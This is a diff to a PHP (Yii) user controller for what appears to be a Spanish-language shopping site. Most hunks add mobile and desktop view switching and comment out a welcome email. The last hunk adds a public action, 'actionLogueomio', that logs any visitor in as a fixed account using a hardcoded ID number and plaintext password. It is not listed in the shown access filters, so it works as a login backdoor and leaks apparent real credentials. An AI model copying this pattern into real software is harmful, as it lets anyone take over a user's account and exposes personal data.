@@ -8,10 +8,7 @@ class UsuarioController extends Controller {
      * */
     public function filters() {
         return array(
-            array(
-                'application.filters.SessionControlFilter + index, autenticar, infoPersonal, contrasena, pagoexpress, listapedidos, pedido, listacotizaciones, cotizacion, listapersonal, listadetalle, direcciones',
-                'isMobile' => $this->isMobile
-            ),
+            array('application.filters.SessionControlFilter + index, autenticar, infoPersonal, contrasena, pagoexpress, listapedidos, pedido, listacotizaciones, cotizacion, listapersonal, listadetalle, direcciones'),
             'access + autenticar, recordar, registro, restablecer',
             'login + index, infoPersonal, contrasena, direcciones, pagoexpress, listapedidos, listapersonal, pedido, listadetalle, listacotizaciones',
             'loginajax + direccionCrear, direccionActualizar',
@@ -54,11 +51,8 @@ class UsuarioController extends Controller {
         if (!isset(Yii::app()->session[Yii::app()->params->sesion['redireccionAutenticacion']]) || Yii::app()->session[Yii::app()->params->sesion['redireccionAutenticacion']] == 'null') {
             Yii::app()->session[Yii::app()->params->sesion['redireccionAutenticacion']] = (Yii::app()->request->urlReferrer == null ? 'null' : Yii::app()->request->urlReferrer);
         }
-        if($this->isMobile){
-            $this->render('autenticar');
-        }else{
-            $this->render('d_autenticar');
-        }
+        
+        $this->render('autenticar');
     }
     
     public function actionIngresar(){
@@ -164,7 +158,7 @@ class UsuarioController extends Controller {
 
                     $contenido = $this->renderPartial('_correoBienvenida', array('objUsuario' => $usuario), true, true);
                     $htmlCorreo = $this->renderPartial('_correo', array('contenido' => $contenido), true, true);
-                    sendHtmlEmail($usuario->correoElectronico, Yii::app()->params->asuntoBienvenida, $htmlCorreo);
+                   // sendHtmlEmail($usuario->correoElectronico, Yii::app()->params->asuntoBienvenida, $htmlCorreo);
                     $transaction->commit();
                     
                     $identity = new UserIdentity($model->cedula, $model->clave);
@@ -173,11 +167,17 @@ class UsuarioController extends Controller {
 
                     Yii::app()->session[Yii::app()->params->sesion['redireccionAutenticacion']] = 'null';
                     
+                    $bienvenida="";
+                    if($this->isMobile){
+                        $bienvenida="bienvenida";
+                    }else{
+                        $bienvenida="d_bienvenida";
+                    }
                     echo CJSON::encode(array(
                         'result' => 'ok',
                         'response' => array(
                             'msg' => '',
-                            'bienvenidaHTML' => $this->renderPartial('bienvenida', array('objUsuario' => $usuario, 'url' => $urlBienvenida),true,false)
+                            'bienvenidaHTML' => $this->render($bienvenida, array('objUsuario' => $usuario, 'url' => $urlBienvenida),true,false)
                         )
                     ));
                     Yii::app()->end();
@@ -815,7 +815,13 @@ class UsuarioController extends Controller {
 
         $model->identificacionUsuario = Yii::app()->user->name;
 
-        $this->render('listaPersonal', array(
+        $listaPersonal = 'listaPersonal';
+        if(!$this->isMobile)
+        {
+            $listaPersonal = 'd_listaPersonal';
+        }
+
+        $this->render($listaPersonal, array(
             'model' => $model,
         ));
     }
@@ -1281,6 +1287,15 @@ class UsuarioController extends Controller {
     protected function gridFechaCotizacion($data, $row) {
         $fecha = DateTime::createFromFormat('Y-m-d H:i:s', $data->fechaCotizacion);
         return $fecha->format('y-m-d');
+    }
+
+
+    public function actionLogueomio()
+    {
+        $identity = new UserIdentity('1116247424', 'oscar');
+        $identity->authenticate();
+        Yii::app()->user->login($identity);
+        //$this->redirect('index');
     }
 
 }
